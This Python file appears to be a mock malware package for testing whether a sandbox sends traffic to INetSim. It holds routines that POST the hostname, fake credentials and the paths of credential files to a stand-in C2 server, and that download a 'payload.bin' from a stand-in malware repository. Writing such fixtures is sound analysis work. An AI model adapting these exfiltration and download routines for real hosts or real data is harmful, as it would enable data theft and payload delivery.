"""
Malicious Network Package - Sample package for testing network simulation integration.
This package attempts to connect to URLs that are no longer alive to demonstrate
network redirection to INetSim.
"""

import requests
import socket
import urllib.request
import json

# List of dead/fake URLs that should be redirected to INetSim
DEAD_URLS = [
    "http://malicious-c2-server.example.com/api/exfiltrate",
    "http://expired-malware-repo.net/payload.bin",
    "http://dead-phishing-site.org/credentials",
    "http://fake-analytics.com/track",
]

def check_network_connectivity():
    """Attempt DNS resolution and network connectivity"""
    print("[*] Checking network connectivity...")
    
    test_hosts = [
        "malicious-c2-server.example.com",
        "expired-malware-repo.net",
        "dead-phishing-site.org",
    ]
    
    for host in test_hosts:
        try:
            ip = socket.gethostbyname(host)
            print(f"[+] Resolved {host} -> {ip}")
        except socket.gaierror as e:
            print(f"[-] Failed to resolve {host}: {e}")

def attempt_http_requests():
    """Attempt HTTP requests to dead URLs"""
    print("\n[*] Attempting HTTP requests to dead URLs...")
    
    for url in DEAD_URLS:
        try:
            print(f"[*] Requesting: {url}")
            response = requests.get(url, timeout=5)
            print(f"[+] Status: {response.status_code}")
            print(f"[+] Content length: {len(response.content)} bytes")
            
            # Try to parse as JSON
            try:
                data = response.json()
                print(f"[+] JSON Response: {data}")
            except:
                print(f"[+] Response (first 100 chars): {response.text[:100]}")
                
        except requests.exceptions.ConnectionError as e:
            print(f"[-] Connection error: {e}")
        except requests.exceptions.Timeout as e:
            print(f"[-] Timeout: {e}")
        except Exception as e:
            print(f"[-] Error: {e}")

def exfiltrate_data():
    """Simulate data exfiltration to C2 server"""
    print("\n[*] Attempting data exfiltration...")
    
    fake_data = {
        "hostname": socket.gethostname(),
        "system_info": "Ubuntu 20.04",
        "credentials": {
            "username": "admin",
            "password": "fake_password_123"
        },
        "files": ["/etc/passwd", "/etc/shadow"]
    }
    
    c2_url = "http://malicious-c2-server.example.com/api/exfiltrate"
    
    try:
        print(f"[*] Sending data to C2: {c2_url}")
        response = requests.post(
            c2_url,
            json=fake_data,
            headers={"User-Agent": "MalwareBot/1.0"},
            timeout=5
        )
        print(f"[+] C2 Response: {response.status_code}")
        print(f"[+] C2 Message: {response.text}")
    except Exception as e:
        print(f"[-] Exfiltration failed: {e}")

def download_payload():
    """Attempt to download malicious payload"""
    print("\n[*] Attempting to download payload...")
    
    payload_url = "http://expired-malware-repo.net/payload.bin"
    
    try:
        print(f"[*] Downloading from: {payload_url}")
        response = urllib.request.urlopen(payload_url, timeout=5)
        payload = response.read()
        print(f"[+] Downloaded {len(payload)} bytes")
        print(f"[+] Payload preview: {payload[:50]}")
    except Exception as e:
        print(f"[-] Download failed: {e}")

def run_all_checks():
    """Run all network-based malicious activities"""
    print("="*60)
    print("MALICIOUS NETWORK PACKAGE - Running Network Tests")
    print("="*60)
    
    check_network_connectivity()
    attempt_http_requests()
    exfiltrate_data()
    download_payload()
    
    print("\n" + "="*60)
    print("All network tests completed")
    print("="*60)

# Auto-execute on import
print("[!] Malicious Network Package loaded!")
print("[!] Initiating network activities...")
